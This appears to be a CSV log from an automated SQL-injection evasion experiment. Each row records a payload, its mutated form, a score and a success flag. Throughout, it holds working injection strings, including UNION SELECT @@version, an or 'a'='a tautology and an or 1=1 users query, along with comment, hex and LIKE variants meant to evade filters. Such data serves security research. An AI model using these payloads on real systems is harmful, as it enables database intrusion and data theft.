+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";-2.3667903497815135;0
+24;1;25;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";6;"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";-2.4667903497815136;0
+25;1;26;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";18;"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";-2.566790349781513;0
+26;1;27;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";18;"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";-2.6667903497815133;0
+27;1;28;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";20;"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";-2.7667903497815134;0
+28;1;29;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";13;"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";-2.8667903497815135;0
+29;1;30;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";9;"""'#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+union#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+NULL,#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+(#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+select#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+@@version#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+)#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+#Q**L$JN
+OR#Q**L$JN
+0#(Obk=(
+--""*";-2.9667903497815136;0
+30;2;1; or 'a' = 'a; or 'a' = 'a;0;/**/or/**/'a'/**/=/**/'a;-0.625;0
+31;2;2; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;13;/**/or/**/'a'/**/=/**/'a;-0.725;0
+32;2;3; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;7;/**/or/**/'a'/**/=/**/'a;-0.825;0
+33;2;4; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;10;/**/or/**/'a'/**/=/**/'a;-0.925;0
+34;2;5; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;18;/**/or/**/'a'/**/=/**/'a;-1.025;0
+35;2;6; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;3;/**/or/**/'a'/**/=/**/'a;-1.125;0
+36;2;7; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;2;/**/or/**/'a'/**/ LIKE /**/'a;-1.0827586114406587;0
+37;2;8; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;12;/**/or/**/'a'/**/ LIKE /**/'a;-1.183870953321457;0
+38;2;9; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;24;/**/or/**/'a'/**/ LIKE /**/'a;-1.283870953321457;0
+39;2;10; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;25;/**/or/**/'a'/**/ LIKE /**/'a;-1.3838709533214568;0
+40;2;11; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;19;/**/or/**/'a'/**/ LIKE /**/'a;-1.483870953321457;0
+41;2;12; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;21;/**/or/**/'a'/**/ LIKE /**/'a;-1.583870953321457;0
+42;2;13; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;25;/**/or/**/'a'/**/ LIKE /**/'a;-1.683870953321457;0
+43;2;14; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;16;/**/or/**/'a'/**/ LIKE /**/'a;-1.783870953321457;0
+44;2;15; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;2;/**/or/**/'a'/**/ LIKE /**/'a;-1.883870953321457;0
+45;2;16; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;0;/**/or/**/'a'/**//**/LIKE/**//**/'a;-2.013513505458832;0
+46;2;17; or 'a' = 'a;/**/or/**/'a'/**//**/LIKE/**//**/'a;13;/**/or/**/'a'/**//**/LIKE/**//**/'a;-2.113513505458832;0
+47;2;18; or 'a' = 'a;/**/or/**/'a'/**//**/LIKE/**//**/'a;18;/**/or/**/'a'/**//**/LIKE/**//**/'a;-2.213513505458832;0
+48;2;19; or 'a' = 'a;/**/or/**/'a'/**//**/LIKE/**//**/'a;6;/**/ || /**/'a'/**//**/LIKE/**//**/'a;-2.158974367380142;0
+49;2;20; or 'a' = 'a;/**/ || /**/'a'/**//**/LIKE/**//**/'a;14;"/**/#'p::b
+||#'p::b
+/**/'a'/**//**/LIKE/**//**/'a";-2.1941176593303684;0
+50;2;21; or 'a' = 'a;"/**/#'p::b
+||#'p::b
+/**/'a'/**//**/LIKE/**//**/'a";6;"/**/#'p::b
+||#'p::b
+/**/'a'/**//**/LIKE/**//**/'a";-2.294117659330368;0
+51;2;22; or 'a' = 'a;"/**/#'p::b
+||#'p::b
+/**/'a'/**//**/LIKE/**//**/'a";14;"/**/#'p::b
+||#'p::b
+/**/'a'/**//**/LIKE/**//**/'a";-2.394117659330368;0
+52;2;23; or 'a' = 'a;"/**/#'p::b
+||#'p::b
+/**/'a'/**//**/LIKE/**//**/'a";3;"/**/#'p::b
+||#'p::b
+/**/'a'/**//**/LIKE/**//**/'a";-2.494117659330368;0
+53;2;24; or 'a' = 'a;"/**/#'p::b
+||#'p::b
+/**/'a'/**//**/LIKE/**//**/'a";1;" #'p::b
+||#'p::b
+ 'a'  LIKE  'a";-2.421212124824524;0
+54;2;25; or 'a' = 'a;" #'p::b
+||#'p::b
+ 'a'  LIKE  'a";16;" #'p::b
+||#'p::b
+ 'a'  LIKE  'a]j";-2.514285714924336;0
+55;2;26; or 'a' = 'a;" #'p::b
+||#'p::b
+ 'a'  LIKE  'a]j";14;"#I0j+?
+#'p::b
+||#'p::b
+#I0j+?
+'a'#I0j+?
+#I0j+?
+LIKE#I0j+?
+#I0j+?
+'a]j";150.0;1
+56;3;1; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;19; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;-0.6206896305084229;0
+57;3;2; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;0;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;-0.6391304492950439;0
+58;3;3; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;5;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;-0.7391304492950439;0
+59;3;4; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;14;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;-0.839130449295044;0
+60;3;5; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;7;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**/or/**/$/**/0x1/**/=/**/0x1/**/or/**/0x1/**/=/**/0x1/**/--/**/1;-0.7840000033378601;0
+61;3;6; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**/or/**/$/**/0x1/**/=/**/0x1/**/or/**/0x1/**/=/**/0x1/**/--/**/1;17;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**/or/**/$/**/0x1/**/=/**/0x1/**/or/**/0x1/**/=/**/0x1/**/--/**/1;-0.8840000033378601;0
+62;3;7; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**/or/**/$/**/0x1/**/=/**/0x1/**/or/**/0x1/**/=/**/0x1/**/--/**/1;1; select * from users where id = 0x1 or $ 0x1 = 0x1 or 0x1 = 0x1 -- 1;-1.0264705777168275;0
+63;3;8; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1 or $ 0x1 = 0x1 or 0x1 = 0x1 -- 1;6; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.0750000000000002;0
+64;3;9; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;6; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.175;0
+65;3;10; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;0;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.2404255211353301;0
+66;3;11; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;22;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.3404255211353302;0
+67;3;12; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;24;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.4404255211353303;0
+68;3;13; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;0;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.5404255211353304;0
+69;3;14; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;12;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.6404255211353302;0
+70;3;15; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.7750000000000001;0
+71;3;16; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;5; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.875;0
+72;3;17; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;7; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.975;0
+73;3;18; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;13;  select  *  from  users  where  id  =  0x1    ||    $  0x1  =  0x1    ||    0x1  =  0x1  --  1;-2.0263157904148104;0
+74;3;19; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;  select  *  from  users  where  id  =  0x1    ||    $  0x1  =  0x1    ||    0x1  =  0x1  --  1;2;  select  *  from  users  where  id   LIKE   0x1    ||    $  0x1   LIKE   0x1    ||    0x1   LIKE   0x1  --  1;-2.1090909123420714;0
+75;3;20; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;  select  *  from  users  where  id   LIKE   0x1    ||    $  0x1   LIKE   0x1    ||    0x1   LIKE   0x1  --  1;3;  select  *  from  users  where  id   LIKE   0x1    ||    $  0x1   LIKE   0x1    ||    0x1   LIKE   0x1  --  1;-2.209090912342072;0
+76;3;21; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;  select  *  from  users  where  id   LIKE   0x1    ||    $  0x1   LIKE   0x1    ||    0x1   LIKE   0x1  --  1;13;    select    *    from    users    where    id      LIKE      0x1        ||        $    0x1      LIKE      0x1        ||        0x1      LIKE      0x1    --    1;-2.2283950597047806;0
+77;3;22; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;    select    *    from    users    where    id      LIKE      0x1        ||        $    0x1      LIKE      0x1        ||        0x1      LIKE      0x1    --    1;23;    select    *    from    users    where    id      LIKE      0x1        ||        $    0x1      LIKE      0x1        ||        0x1      LIKE      0x1    --    1;-2.3283950597047807;0
+78;3;23; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;    select    *    from    users    where    id      LIKE      0x1        ||        $    0x1      LIKE      0x1        ||        0x1      LIKE      0x1    --    1;0;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.4594936788082125;0
+79;3;24; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;3;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.5594936788082125;0
